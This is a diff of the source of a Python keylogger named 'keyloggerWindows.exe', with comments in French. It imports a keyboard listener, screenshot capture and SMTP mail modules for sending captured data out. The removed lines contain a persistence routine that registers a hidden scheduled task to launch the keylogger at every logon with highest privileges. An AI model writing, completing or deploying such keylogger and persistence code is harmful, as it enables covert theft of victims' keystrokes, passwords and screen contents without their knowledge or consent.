@@ -1,47 +1,13 @@
 import logging
 from threading import Thread
-import PIL.ImageGrab
 from pynput.keyboard import Key, Listener
-import smtplib,ssl
+import smtplib, ssl
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
-import subprocess
 import time
-import os
-
-
-#--------DÉBUT TÂCHES PROGRAMMÉES---------------
-
-# Définir le chemin de l'exécutable
-executable_path = os.path.join(os.getcwd(), 'keyloggerWindows.exe')
-
-# Définir les paramètres de la tâche planifiée
-task_name = "Mon programme au démarrage"
-delay = 30  # Délai en secondes
-
-# Commande pour créer une tâche planifiée qui exécute l'exécutable au démarrage avec temporisation
-task_command = (
-    f'schtasks /create /tn "{task_name}" /tr "cmd /c timeout /t {delay} & {executable_path}" '
-    f'/sc onlogon /rl highest /f'
-)
-# Vérifier si la tâche existe déjà
-check_task = subprocess.run(['schtasks', '/query', '/tn', task_name], capture_output=True, text=True)
-
-# Ajouter la tâche planifiée si elle n'existe pas
-if "ERROR" in check_task.stdout:
-    result = subprocess.run(task_command, shell=True, capture_output=True, text=True)
-    if result.returncode == 0:
-        print(f"L'exécutable a été ajouté au démarrage avec le nom de tâche '{task_name}'.")
-    else:
-        print("Erreur lors de la création de la tâche :", result.stderr)
-else:
-    print("L'exécutable est déjà configuré pour démarrer automatiquement.")
-
-
-#--------FIN TÂCHES PROGRAMMÉES----------------
-
+import PIL.ImageGrab
 
 #--------DÉBUT PARTIE ENVOI MAIL----------------
 
